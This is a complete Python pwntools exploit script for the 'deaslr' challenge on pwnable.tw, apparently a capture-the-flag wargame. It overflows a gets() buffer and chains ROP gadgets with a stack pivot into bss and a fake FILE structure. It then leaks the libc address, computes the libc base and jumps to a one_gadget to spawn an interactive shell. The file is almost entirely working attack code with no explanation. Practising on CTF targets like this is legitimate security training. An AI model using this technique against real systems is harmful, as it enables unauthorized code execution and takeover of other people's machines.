from pwn import*

context(os='linux', arch='amd64', log_level='debug')

#env = {}
#env = {'LD_PRELOAD' : './libc_64.so.6'}
p = process('./deaslr')#, env=env)


#p=remote("chall.pwnable.tw",10402)

libc = ELF('./libc_64.so.6')
elf = ELF('./deaslr')


def g(p):
    gdb.attach(p)
    raw_input()

bss = 0x601010
gets_plt=0x400430
gets_got=0x600ff0
pop_rdi = 0x4005c3
pop_rsp_r13_r14_r15 = 0x00000000004005bd
pop_rbx_rbp_r12_r13_r14_r15 = 0x4005ba
pop_r12_r13_r14_r15 = 0x4005bc
pop_rsi_r15 = 0x00000000004005c1
pop_r13_r14_r15 = 0x4005be
mrdx13_mrsi14_mrdi15_call = 0x4005a0 # mov rdx, r13 ; mov rsi, r14 ; mov edi, r15d ; call qword ptr [r12 + rbx*8]
call_r12_plus_rbx_mul_8 = 0x4005a9
main = 0x400536

buf = bss + 0x100
buf1 = bss+ 0x200 

fake_file = "\x00"*0x70+p64(1)+p64(2)
fake_file =fake_file.ljust(0xe0,"\x00")

g(p)

rop1=p64(pop_rdi)+p64(buf1)+p64(gets_plt)+p64(main)
p.sendline("a"*24+rop1)

call_rop=p64(pop_r13_r14_r15)+p64(0x8)+p64(gets_got)+p64(buf1)+p64(mrdx13_mrsi14_mrdi15_call)+"p"*0x38+p64(main)
p.sendline(fake_file+call_rop)

rop2=p64(pop_rdi)+p64(buf)+p64(gets_plt)+p64(pop_rsp_r13_r14_r15)+p64(buf)
p.sendline('b'*24 + rop2)

rop3="c"*8 + p64(pop_rsp_r13_r14_r15) + p64(buf1 + 0xe0 - 0x18)+ p64(pop_rdi)+p64(buf-0x38)+p64(gets_plt)+p64(pop_rsp_r13_r14_r15)+p64(buf-0x50)
p.sendline(rop3)

p.sendline(p64(pop_rbx_rbp_r12_r13_r14_r15)+ p64(0xfffffffffffffdeb) + p64(0xfffffffffffffdeb+1))

leak_libc = u64(p.recv(8))
libc = leak_libc - libc.symbols['gets']
print "libc : " +hex(libc)
one_gadget=libc + 0xf02a4	

p.sendline('d'*24 + p64(one_gadget))

p.interactive()
